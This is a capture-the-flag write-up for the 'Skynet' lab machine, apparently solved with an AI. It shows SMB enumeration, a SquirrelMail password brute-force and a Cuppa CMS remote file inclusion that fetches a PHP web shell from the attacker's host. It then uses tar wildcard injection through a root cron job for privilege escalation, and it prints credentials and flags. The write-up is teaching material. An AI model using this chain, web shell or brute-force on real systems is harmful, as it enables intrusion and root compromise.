# Skynet CTF Writeup
(*solved by gemini 🤖🤖🤖*)
## Information Gathering

First, we started with an Nmap scan to identify open ports and services running on the target machine (`10.48.182.39`).

```bash
nmap -sV -sC -p- -T4 --min-rate 10000 10.48.182.39
```

The scan revealed several open ports:
- `22/tcp` (SSH)
- `80/tcp` (HTTP)
- `110/tcp` (POP3)
- `139/tcp` (NetBIOS-SSN)
- `143/tcp` (IMAP)
- `445/tcp` (Microsoft-DS / SMB)

## Enumeration

### SMB Enumeration
We enumerated the SMB shares anonymously using `smbclient`:

```bash
smbclient -L //10.48.182.39 -N
```

This revealed an `anonymous` share and a `milesdyson` share. We connected to the `anonymous` share:

```bash
smbclient //10.48.182.39/anonymous -N
```

Inside, we found an `attention.txt` file and a `logs` directory containing `log1.txt` (a password list), `log2.txt`, and `log3.txt`.

`attention.txt` contents:
> A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
> -Miles Dyson

`log1.txt` contained a list of potential passwords which we saved locally for brute-forcing.

### HTTP Enumeration
Port 80 hosts a web server. Using `gobuster`, we found a SquirrelMail installation at `/squirrelmail/`.

```bash
gobuster dir -u http://10.48.182.39 -w /usr/share/wordlists/dirb/common.txt
```

We used `ffuf` to brute-force the SquirrelMail login for the user `milesdyson` using the `log1.txt` wordlist:

```bash
ffuf -u http://10.48.182.39/squirrelmail/src/redirect.php -X POST -d "login_username=milesdyson&secretkey=FUZZ&js_autodetect_results=0&just_logged_in=1" -w log1.txt -fs 302 -fr "Unknown user or password incorrect."
```

The brute-force attack successfully identified the password: `cyborg007haloterminator`.

## Gaining Access

### Miles Dyson's Emails and SMB Share
Logging into SquirrelMail with `milesdyson:cyborg007haloterminator`, we found three emails. The most interesting one was titled "Samba Password reset" which contained:

> We have changed your smb password after system malfunction.
> Password: )s{A&2Z=F^n_E.B`

Using this new password, we accessed Miles Dyson's personal SMB share:

```bash
smbclient //10.48.182.39/milesdyson -U milesdyson%" )s{A&2Z=F^n_E.B`"
```

In the `notes` directory of this share, we found `important.txt`:

> 1. Add features to beta CMS /45kra24zxs28v3yd
> 2. Work on T-800 Model 101 blueprints
> 3. Spend more time with my wife

### The Hidden Directory and Cuppa CMS
The text file revealed a hidden directory: `/45kra24zxs28v3yd`. Running `gobuster` on this hidden directory discovered an `/administrator/` path, which hosted a Cuppa CMS installation.

Searching for vulnerabilities in Cuppa CMS using `searchsploit`:

```bash
searchsploit Cuppa CMS
```

This revealed a Local/Remote File Inclusion (LFI/RFI) vulnerability in `/alerts/alertConfigField.php` via the `urlConfig` parameter.

### Exploiting RFI for Initial Shell
We hosted a simple PHP command execution script (`cmd.php`) on our local machine using Python's HTTP server:

```php
<?php system($_GET['cmd']); ?>
```
```bash
python3 -m http.server 8000
```

We verified the RFI and got command execution as `www-data`:

```bash
curl -s "http://10.48.182.39/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<OUR_IP>:8000/cmd.php&cmd=id"
```

Using this RFI-to-RCE, we read the user flag located at `/home/milesdyson/user.txt`:

```bash
curl -s "http://10.48.182.39/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt"
```
**User Flag:** `7ce5c2109a40f958099283600a9ae807`

## Privilege Escalation

While exploring the system with our web shell, we checked Miles Dyson's home directory and found a `/backups` directory containing a `backup.sh` script:

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Checking `/etc/crontab` revealed that this script was being executed as `root` every minute:
```bash
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
```

### Tar Wildcard Injection
The `backup.sh` script uses a wildcard (`*`) with the `tar` command. This is vulnerable to Tar Wildcard Injection. When `tar` expands `*`, files with names starting with `--` are treated as command-line arguments.

We created two files in `/var/www/html` to exploit this:
1. `--checkpoint=1`
2. `--checkpoint-action=exec=sh exploit.sh`

And a malicious `exploit.sh` script to copy the root flag to `/tmp/root_flag.txt`:

```bash
# Create exploit payload
curl -s "http://10.48.182.39/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<OUR_IP>:8000/cmd.php&cmd=echo 'cat /root/root.txt > /tmp/root_flag.txt' > /var/www/html/exploit.sh"

# Make it executable
curl -s "http://10.48.182.39/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<OUR_IP>:8000/cmd.php&cmd=chmod +x /var/www/html/exploit.sh"

# Create checkpoint files
curl -s "http://10.48.182.39/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<OUR_IP>:8000/cmd.php&cmd=touch /var/www/html/--checkpoint=1"

curl -s "http://10.48.182.39/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<OUR_IP>:8000/cmd.php&cmd=touch \"/var/www/html/--checkpoint-action=exec=sh exploit.sh\""
```

After waiting a minute for the cron job to run, the `tar` command executed our `exploit.sh` script as `root`. We then read the root flag from `/tmp`:

```bash
curl -s "http://10.48.182.39/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<OUR_IP>:8000/cmd.php&cmd=cat /tmp/root_flag.txt"
```
**Root Flag:** `3f0372db24753accc7179a282cd6a949`

